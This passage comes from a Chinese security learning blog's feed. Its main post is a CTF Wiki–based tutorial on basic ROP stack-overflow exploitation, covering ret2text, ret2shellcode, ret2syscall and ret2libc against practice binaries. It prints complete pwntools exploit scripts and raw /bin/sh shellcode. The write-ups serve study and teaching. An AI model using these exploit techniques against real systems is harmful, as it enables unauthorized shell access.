class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-comment">//全局变量</span><br><span class="hljs-keyword">var</span> c <span class="hljs-keyword">int</span> = <span class="hljs-number">1</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//局部变量</span><br><span class="hljs-keyword">var</span> a, b <span class="hljs-keyword">int</span><br>a = <span class="hljs-number">1</span><br>b = <span class="hljs-number">2</span><br>fmt.Println(a, b, c)<br>d := add(a, b)<br>fmt.Println(d)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(a, b <span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;<br><span class="hljs-keyword">return</span> a + b<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Go语言学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基本ROP</title>
    <link href="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/"/>
    <url>/2021/11/26/%E5%9F%BA%E6%9C%ACROP/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>还是继续学习练习ROP技术，现在是跟着CTF WIKI中的ROP来学习一下。</p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">基本ROP</a></p><h2 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h2><p>随着NX的保护开启，曾经直接向栈或者堆上直接注入代码的方式难以继续发挥作用。攻击者也提出了相应的方法来绕过保护，目前主要的是ROP，其主要的思想就是在栈缓冲区溢出的基础上，利用程序中已经有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓的gadget就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p><p>叫做ROP的原因是，利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般满足以下条件：</p><ul><li>程序存在溢出，并且可以控制返回地址</li><li>可以知道满足条件的gadgets以及相应的gadgets地址</li></ul><h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>ret2text即控制程序执行程序本身已有的代码（.text）。这种攻击方法是一种笼统的描述，我们控制执行程序已有的代码也可以控制程序执行好几段不相邻的程序已有的代码（也就是gadgets），就是所谓的ROP。</p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>用ret2text做例子</p><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p><p>查看一下保护机制，看到只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/1.png"></p><p>使用IDA查看，看到有一个gets函数，存在一个栈溢出漏洞</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/2.png"></p><p>还看到了有<code>system(/bin/sh)</code>，只要覆盖返回地址到这里就可以了。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/3.png"></p><p>现在来尝试构造一下payload，使用GDB打开调试看一下栈的情况，输入112个a和4个b，看到此时的栈空间</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/4.png"></p><p>查看执行到ret的时候，返回的地址是bbbb，证明构造的payload是对的，将bbbb换成要返回的地址0x804863A即可。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/5.png"></p><p>编写EXP</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br><span class="hljs-attribute">payload</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804863</span>A<br><span class="hljs-attribute">p</span>.sendline(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">112</span> + p<span class="hljs-number">32</span>(payload))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/6.png"></p><h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>ret2shellcode就是控制程序流程执行shellcode代码。在栈溢出的基础上，执行shellcode，需要对应的区域具有可执行的权限。</p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><p>例子在这里下载<a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p><p>首先查看一下程序的保护机制，几乎没有开启任何的保护，且有可读可写可执行的段。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/7.png"></p><p>使用IDA查看，可以看到存在栈溢出，输入的内容会被复制到<code>buf2</code>之中。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/8.png"></p><p>查看<code>buf2</code>可以看到是在bss段。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/9.png"></p><p>使用gdb打开调试，上面看到<code>buf2</code>在0x804A080，从这里看到有可执行权限。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/10.png"></p><p>调试确定payload的长度，输入112个a和4个b，可以看到返回地址是bbbb，现在就可以确定长度了。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/11.png"></p><p>生成一段shellcode，填充到112位，然后把返回地址覆盖到<code>buf2</code>的起始地址，在段上执行shellcode就可以了。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">p</span> = process(<span class="hljs-string">&quot;./ret2shellcode&quot;</span>)<br><span class="hljs-attribute">shellcode</span> = asm(shellcraft.sh())<br><span class="hljs-attribute">buf2_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">804</span>a<span class="hljs-number">080</span><br><span class="hljs-attribute">p</span>.sendline(shellcode.ljust(<span class="hljs-number">112</span>,<span class="hljs-string">&quot;p&quot;</span>) + p<span class="hljs-number">32</span>(buf<span class="hljs-number">2</span>_addr))<br><span class="hljs-attribute">p</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/12.png"></p><h4 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/stackoverflow/ret2shellcode/sniperoj-pwn100-shellcode-x86-64/shellcode">sniperoj-pwn100-shellcode-x86-64</a></p><p>查看保护机制，只开启了PIE，也就是基址随机化。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/13.png"></p><p>分析一下程序，看到<code>read</code>函数会将数据读到<code>buf</code>中，存在一个栈溢出，段可执行，应该要自己构造shellcode来获取shell。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/14.png"></p><p>现在来尝试构造一下payload，<code>buf</code>长度0x10，构造24个a加上8个b，用来覆盖返回地址。看到返回地址被成功覆盖</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/16.png"></p><p>但是这次不可以用刚才pwntools中生成的那个shellcode了，因为<code>read</code>函数只能读取64个字节的数据，从图中可以看到这个shellcode是44个字节</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/17.png"></p><p>需要找新的shellcode，在这里可以寻找对应的shellcode，也可以自己尝试去写</p><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p>我找到了这个shellcode，22字节</p><p><a href="https://www.exploit-db.com/shellcodes/47008">https://www.exploit-db.com/shellcodes/47008</a></p><p>这次exp的编写，shellcode不可以放在返回地址之前了，因为这样栈空间是不足的，在shellcode里有好几个push的操作，且它并没有开辟栈空间，比如<code>sub esp,0x100</code>，我们知道栈是从栈顶开始入栈的，此时我们的代码是放在栈顶之上的，如果不断的push 压栈，那么我们的栈里的代码就会被破坏</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/18.png"></p><p>就像这个图一样，不断的压栈会破坏代码</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/19.png"></p><p>原始代码</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/20.png"></p><p>被破坏的代码和栈的情况，这部分具体在之前的文章有讲过<a href="https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">栈溢出原理与实践</a></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/21.png"></p><p>现在尝试编写exp，把shellcode放在后面，放在后面的不管怎么压栈都不会破坏代码。</p><p>因为是动态基址，所以关键在于buf的地址获取，但是题目中给了我们buf的地址，所以不用担心。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/22.png"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./sniperoj-pwn100-shellcode-x86-64&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>buf_addr = p.recvuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-literal">True</span>)<br>shellcode = <span class="hljs-string">&quot;\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05&quot;</span><br>buf_addr = <span class="hljs-built_in">int</span>(buf_addr , <span class="hljs-number">16</span>)<br>buf_addr += <span class="hljs-number">32</span><br><span class="hljs-comment">#print(hex(buf_addr))</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">24</span> + p64(buf_addr) + shellcode<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/23.png"></p><h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>ret2syscall，就是控制程序执行系统调用的，获取shell</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p><p>查看保护机制，开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/24.png"></p><p>使用IDA打开，可以看到<code>gets</code>函数存在栈溢出，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/25.png"></p><p>查看字符串，存在<code>/bin/sh</code>，但是找不到<code>system</code>函数，需要自己构造</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/26.png"></p><p>可以通过gadgets来获得shell。我们需要把获取对应shell的系统调用放到对应的寄存器中，这样在执行<code>int 0x80</code>可以执行对应的系统调用</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">execve</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>,null.null)</span></span><br></code></pre></div></td></tr></table></figure><p>对于这个32位的程序，需要构造如下的寄存器</p><ul><li>系统调用号，eax=0xb</li><li>第一个参数，ebx应该指向<code>/bin/sh</code>的地址，或者是执行sh的地址</li><li>第二个参数，ecx=0</li><li>第三个参数，edx=0</li></ul><p>控制寄存器的值，就需要用到gadgets，此时栈顶是10，执行一个pop eax之后，eax就等于10。但是在程序中不一定有连续的可以控制这些寄存器的值，需要一段一段的控制。寻找gadgets的方法，可以使用ropgadgets工具。</p><p>查找pop eax和ret的地址，找到一个pop eax，在retn的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/27.png"></p><p>看到这个地址</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm"><span class="hljs-number">0x080bb196</span> : <span class="hljs-keyword">pop</span> <span class="hljs-built_in">eax</span> <span class="hljs-comment">; ret</span><br></code></pre></div></td></tr></table></figure><p>再找pop ebx和ret的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/28.png"></p><p>看到这样一个地址，剩下三个寄存器都可以用到。</p><figure class="highlight gauss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gauss"><span class="hljs-number">0x0806eb90</span> : <span class="hljs-keyword">pop</span> edx ; <span class="hljs-keyword">pop</span> ecx ; <span class="hljs-keyword">pop</span> ebx ; ret<br></code></pre></div></td></tr></table></figure><p>现在就可以来控制程序的流程，首先覆盖返回地址到上述两个地址任意一个，比如pop eax/ret地址这，然后再覆盖下面的为0xb，这样ret就会到pop eax/ret这里，然后pop eax，eax就是0xb，之后是一样的流程。</p><p>现在来确定一下payload长度，使用GDB调试，输入112个a，再输入4个b，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/29.png"></p><p>编写EXP</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./rop&quot;</span>)<br>pop_eax_ret = <span class="hljs-number">0x80bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x806eb90</span><br>int_80_addr = <span class="hljs-number">0x8049421</span><br>binsh_addr = <span class="hljs-number">0x80be408</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(pop_eax_ret)+p32(<span class="hljs-number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="hljs-number">0</span>) +p32(<span class="hljs-number">0</span>) + p32(binsh_addr)+ p32(int_80_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/30.png"></p><h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>ret2libc就是控制函数的执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置（即函数对应的got表项的内容）。一般情况下，会选择执行<code>system(&quot;/bin/sh&quot;)</code>，所以需要知道<code>system</code>函数的地址。</p><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p><p>查看一下保护机制，看到只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/31.png"></p><p>使用IDA查看，看到存在一个<code>gets</code>函数，存在栈溢出</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/32.png"></p><p>在IDA里能看到<code>system</code>函数，还有<code>/bin/sh</code>的地址，那么就可以获取shell。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/33.png"></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/34.png"></p><p>确定payload，这次用cyclic这个工具来获取一下需要覆盖到返回地址的长度，</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/35.png"></p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/36.png"></p><p>编写EXP</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>bin_addr = <span class="hljs-number">0x8048720</span><br>system_addr = <span class="hljs-number">0x8048460</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">112</span> + p32(system_addr) + <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">4</span> + p32(bin_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/37.png"></p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p><p>查看保护机制，只开启了NX保护</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/39.png"></p><p>用IDA查看，可以看到有一个<code>gets</code>函数，存在栈溢出，跟上一道题一样到流程</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/38.png"></p><p>只是这道题只有<code>system</code>的地址，但是没有<code>/bin/sh</code>，所以要自己构造。</p><p>在bss段还可以找到<code>buf2</code>，可以把<code>/bin/sh</code>写到<code>buf2</code>中。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/40.png"></p><p>查看bss段属性可写可读</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/41.png"></p><p>然后再找到<code>gets</code>函数地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/42.png"></p><p>偏移量跟上一个是一样的，就不再计算了，现在尝试构造payload。</p><p>现在有两种构造的方法，第一个就是，覆盖返回地址为<code>gets</code>函数地址，然后是返回地址，返回地址是一个<code>pop/ret</code>的地址，然后是<code>buf2</code>的地址，此时<code>gets</code>会把输入存在<code>buf2</code>内，然后是<code>system</code>函数地址，任意一个返回地址，<code>buf2</code>地址。这样的执行流程，首先是返回到<code>gets</code>，输入<code>/bin/sh</code>保存到<code>buf2</code>，然后返回到<code>pop/ret</code>的地方， pop一次，将<code>buf2</code>地址弹出去，此时栈顶是<code>system</code>函数地址，再次ret就会执行<code>system(&quot;/bin/sh&quot;)</code></p><p>第二个就是不需要<code>pop/ret</code>的地址，直接把<code>system</code>函数地址作为<code>gets</code>函数的返回地址，执行流程是一样的。</p><h5 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h5><p>查找<code>pop/ret</code>的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/43.png"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br><br>pop_ret_addr = <span class="hljs-number">0x804843d</span><br>gets_addr = <span class="hljs-number">0x8048460</span><br>system_addr = <span class="hljs-number">0x8048490</span><br>buf2_addr = <span class="hljs-number">0x804a080</span><br><br><span class="hljs-comment">#第一种方法</span><br><span class="hljs-comment">#payload = &#x27;a&#x27;*112 + p32(gets_addr) + p32(pop_ret_addr) + p32(buf2_addr) + p32(system_addr) + &#x27;b&#x27;*4 + p32(buf2_addr)</span><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">112</span> + p32(gets_addr) + p32(system_addr) + p32(buf2_addr)+ p32(buf2_addr)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/44.png"></p><h4 id="例3"><a href="#例3" class="headerlink" title="例3"></a>例3</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p><p>查看保护只开启了NX。</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/45.png"></p><p>看到存在栈溢出，可以尝试ROP。此例子是在例2的基础上，将<code>system</code>函数的地址去掉，此时需要同时找到<code>system</code>函数地址和</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/46.png"></p><p>现在的问题就是如何寻找<code>system</code>函数的地址。</p><p><code>system</code>函数属于<code>libc</code>，而<code>libc.so</code>动态链接库中的函数相对偏移是固定的。即使程序有ASLR，最低的12位也不会改变，而libc在<a href="https://github.com/niklasb/libc-database">github</a>上有人进行收集。</p><p>我们如果知道了libc中某个函数的地址，那么就可以确定该程序利用的libc，进而可以知道system函数的地址。得到libc中函数地址一般是用got表泄露，就是输出某个函数对应的got表项的内容。当然，由于libc的延迟绑定机制，我们需要泄露已经执行过得函数的地址。</p><p>现在来手工先寻找一下这些地址，来加深理解。</p><p>先来寻找一下libc的基址，使用gdb加载libc3，然后打印出<code>__libc_start_main</code>的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/47.png"></p><p>使用<code>ldd</code>命令可以查看程序依赖的libc版本，再将其复制到当前路径下</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/48.png"></p><p>搜索<code>__libc_start_main</code>可以看到其偏移是<code>0x18e30</code>，由此可以算出基址是</p><blockquote><p>0xf7df5e30-0x18e30=0xf7ddd000</p></blockquote><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/49.png"></p><p>有了基址就可以计算出其他的地址</p><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/50.png"></p><p>现在的思路就是，通过现有的函数打印出<code>__libc_start_main</code>的地址，然后寻找<code>libc</code>中的地址，来计算基址，有了基址，查找到<code>system</code>和<code>/bin/sh</code>的偏移就可以得到。</p><p>现在编写个EXP，通过利用<code>LibcSearcher</code>可以快速的帮助查找。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/51.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习CTF wiki上的基本rop技术，很多文字性的描述就直接用了上面的描述，原理性的东西基本都理解了，利用方式也都理解，后续还需要多多练习一下。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ROP学习</title>
    <link href="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇来学习一下ROP技术。对于栈溢出来说，可以构造足够长的数据来进行溢出，同时也可以在栈上存放可执行代码，在这里<a href="https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">栈溢出原理与实践</a>有介绍关于在栈上执行代码。如果在栈上不可以执行代码，就需要通过ROP跳转到libc获得shell。本篇主要是学习网上的资源，<a href="https://bbs.pediy.com/thread-263734.htm#msg_header_h1_0">从0开始CTF-PWN（四）ROP绕过栈可执行保护与GOT表劫持</a></p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>代码</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br>    <span class="hljs-keyword">if</span> (argc &lt; 